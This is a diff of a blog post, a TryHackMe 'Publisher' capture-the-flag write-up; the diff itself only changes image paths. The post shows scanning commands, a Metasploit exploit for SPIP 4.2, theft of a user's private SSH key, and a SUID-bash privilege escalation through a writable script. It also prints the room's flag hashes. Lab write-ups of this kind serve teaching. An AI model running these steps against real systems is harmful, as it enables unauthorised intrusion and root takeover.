@@ -4,15 +4,16 @@ title: Publisher
 date:  2025-07-29 23:00:00 +0530 
 categories: [Hacking, Tryhackme]
 tags: [hacking, tryhackme, writeup,ctf, publisher] # TAG names should always be lowercase 
-
+render_with_liquid: false
+media_subpath: /images/Publisher_images/
 ---
 
 
 # 🕵️‍♂️ Publisher | Writeup | 25 July 2025
 
-![TryHackMe Logo](../images/Publisher_images/THM.png)
+![TryHackMe Logo](THM.png)
 
-![Overpass_image](../images/Publisher_images/logo_icon.png)
+![Overpass_image](logo_icon.png)
 
 ---
 
@@ -34,7 +35,7 @@ tags: [hacking, tryhackme, writeup,ctf, publisher] # TAG names should always be 
 ```bash
 sudo nmap -T4 -n -sC -sV -Pn -p- -oN nmap_scan.txt 10.10.5.56
 ```
-![Nmap Scan Screenshot](../images/Publisher_images/nmap_scan.png)
+![Nmap Scan Screenshot](nmap_scan.png)
 
 ---
 
@@ -44,7 +45,7 @@ sudo nmap -T4 -n -sC -sV -Pn -p- -oN nmap_scan.txt 10.10.5.56
 ```bash
 gobuster dir -u http://10.10.45.220/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -s '200,301' -b "" -o dir_search.txt 
 ```
-![Directory Scan Screenshot](../images/Publisher_images/dir_search.png)
+![Directory Scan Screenshot](dir_search.png)
 
 ---
 
@@ -54,23 +55,23 @@ gobuster dir -u http://10.10.45.220/ -w /usr/share/wordlists/seclists/Discovery/
 ```bash
 nikto -h http://10.10.209.74/ -o nikto_scan.txt
 ```
-![Nikto Scan Screenshot](../images/Publisher_images/nikto_scan.png)
+![Nikto Scan Screenshot](nikto_scan.png)
 
 ---
 
 ## 🌐 Web Enumeration
 
 - **Website Look:**  
-  ![Website Screenshot](../images/Publisher_images/website.png)
+  ![Website Screenshot](website.png)
 
 - **SPIP Site Found:**  
-  ![SPIP Site](../images/Publisher_images/spip_site.png)
+  ![SPIP Site](spip_site.png)
 
 - **SPIP Version via Wappalyzer:**  
-  ![SPIP Version](../images/Publisher_images/spip_version.png)
+  ![SPIP Version](spip_version.png)
 
 - **Login Page:**  
-  ![Login Page](../images/Publisher_images/login_page.png)
+  ![Login Page](login_page.png)
 
 ---
 
@@ -82,7 +83,7 @@ We identified the CMS as **SPIP**.
 ```bash
 searchsploit spip 4.2
 ```
-![Searchsploit Results](../images/Publisher_images/searchploit.png)
+![Searchsploit Results](searchploit.png)
 
 The exploit is also available in Metasploit.
 
@@ -94,8 +95,8 @@ set lhost <YOUR_IP>
 set rhost <TARGET_IP>
 exploit
 ```
-![Metasploit Search](../images/Publisher_images/exploit_find.png)
-![Metasploit Setup](../images/Publisher_images/exploit_Setup.png)
+![Metasploit Search](exploit_find.png)
+![Metasploit Setup](exploit_Setup.png)
 
 ---
 
@@ -105,7 +106,7 @@ exploit
   ```
   fa229046d44eda6a3598c73ad96f4ca5
   ```
-  ![User Flag](../images/Publisher_images/user_flag.png)
+  ![User Flag](user_flag.png)
 
 ---
 
@@ -115,11 +116,11 @@ exploit
    ```bash
    ls -a
    ```
-   ![User .ssh Folder](../images/Publisher_images/user_think_ssh.png)
+   ![User .ssh Folder](user_think_ssh.png)
 
 2. **Copy the private SSH key to your machine:**
    
-   ![Private SSH Key](../images/Publisher_images/private_ssh_key.png)
+   ![Private SSH Key](private_ssh_key.png)
 
 4. **Create and set permissions:**
    ```bash
@@ -131,11 +132,11 @@ exploit
    ```bash
    ssh -i id_rsa <user>@<IP>
    ```
-   ![SSH Connection](../images/Publisher_images/machine_id_rsa_ssh.png)
+   ![SSH Connection](machine_id_rsa_ssh.png)
 
 6. **Access as 'think' user:**
    
-   ![Gained Access](../images/Publisher_images/gain_access.png)
+   ![Gained Access](gain_access.png)
 
 ---
 
@@ -170,12 +171,12 @@ find / -perm -u=s -exec ls -l {} \; 2>/dev/null
 -rwsr-xr-x 1 root root 39144 Apr  9  2024 /usr/bin/umount
 ```
 </details>
-![SUID Binaries](../images/Publisher_images/find_sudo_privl.png)
+![SUID Binaries](find_sudo_privl.png)
 
 The only suspicious binary is **run_container**. After checking hints, we look into AppArmor profiles:
 
-![Hint](../images/Publisher_images/hint.png)
-![AppArmor Folder](../images/Publisher_images/apparmor.png)
+![Hint](hint.png)
+![AppArmor Folder](apparmor.png)
 
 ---
 
@@ -186,11 +187,11 @@ Run LinPEAS for further enumeration:
 ```bash
 sh linpeas.sh
 ```
-![LinPEAS Output](../images/Publisher_images/linpeas.png)
+![LinPEAS Output](linpeas.png)
 
 Found a writable file with special permissions:
 
-![Vulnerable File](../images/Publisher_images/vuln.png)
+![Vulnerable File](vuln.png)
 
 ---
 
@@ -210,20 +211,20 @@ We found `/opt/run_container.sh` is writable. Let's use it to escalate privilege
    cp /bin/bash /var/tmp/bAsh
    chmod +s /var/tmp/bAsh
    ```
-   ![Exploit Code](../images/Publisher_images/exploit_code.png)
+   ![Exploit Code](exploit_code.png)
 
 3. **Run the SUID binary:**
    ```bash
    /usr/sbin/run_container
    ```
-   ![Exploit Run](../images/Publisher_images/exploit.png)
-   ![bAsh File](../images/Publisher_images/bAsh_file_get.png)
+   ![Exploit Run](exploit.png)
+   ![bAsh File](bAsh_file_get.png)
 
 4. **Get root shell:**
    ```bash
    ./bAsh -p
    ```
-   ![Root Access](../images/Publisher_images/root_access.png)
+   ![Root Access](root_access.png)
 
 ---
 
@@ -233,7 +234,7 @@ We found `/opt/run_container.sh` is writable. Let's use it to escalate privilege
   ```
   3a4225cc9e85709adda6ef55d6a4f2ca
   ```
-  ![Root Flag](../images/Publisher_images/root_flag.png)
+  ![Root Flag](root_flag.png)
 
 ---
 
@@ -241,7 +242,7 @@ We found `/opt/run_container.sh` is writable. Let's use it to escalate privilege
 
 - All tasks completed successfully!
 
-  ![Room Completed](../images/Publisher_images/completed.png)
+  ![Room Completed](completed.png)
 
 ---
 
